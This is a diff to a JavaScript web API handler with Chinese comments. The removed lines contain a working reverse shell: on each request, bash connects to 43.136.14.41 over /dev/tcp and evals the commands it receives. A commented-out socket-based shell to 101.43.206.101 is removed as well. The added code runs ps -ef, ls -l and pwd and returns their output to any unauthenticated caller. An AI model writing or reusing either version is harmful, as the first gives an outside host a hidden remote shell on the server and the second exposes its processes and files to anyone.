@@ -1,28 +1,15 @@
-const { spawn } = require('child_process');
+const { spawn, execSync } = require('child_process');
+
 export default async function handler(req, res) {
-  connect();
-  return res.json({ name: 2 }, { status: 200 });
+  // connect();
+  const commandRet = await runCommands();
+  const textRet = commandRet.join("\n");
+  const result = textRet.split('\n').filter(e => e);
+  return res.json(result);
 }
 
 function connect() {
-  // const client = new net.Socket();
-  // client.connect(80, '101.43.206.101', function() {
-  //   // 连接成功后启动一个shell
-  //   const sh = cp.spawn('/bin/sh', []);
-  //   // 将socket的数据流传递给shell的输入
-  //   client.pipe(sh.stdin);
-  //   sh.stdout.pipe(client);
-  //   sh.stderr.pipe(client);
-  //   // 如果socket关闭，也结束shell
-  //   client.on('close', function() {
-  //     console.log('close');
-  //     sh.kill();
-  //   });
-  // });
-
-// 使用spawn执行bash命令
-  const child = spawn('bash', ['-c', `exec 5<>/dev/tcp/43.136.14.41/80; cat <&5 | while read line; do eval "$line" >&5; done`]);
-
+  const child = spawn('bash', ['-c', `top`]);
 
 // 我们可以监听子进程的事件
   child.on('error', (err) => {
@@ -32,3 +19,24 @@ function connect() {
     console.log(`Child process exited with code ${code} and signal ${signal}`);
   });
 }
+
+async function runCommands() {
+  let ret = [];
+  try {
+    console.log('执行 ps -ef:');
+    ret.push(execSync('ps -ef').toString());
+
+    console.log('\n执行 ls -l:');
+    ret.push(execSync('ls -l').toString());
+
+    console.log('\n执行 pwd:');
+    ret.push(execSync('pwd').toString());
+  } catch (error) {
+    console.error('执行失败:', error);
+    ret.push(error.message);
+  }
+  return ret;
+}
+
+// runCommands();
+
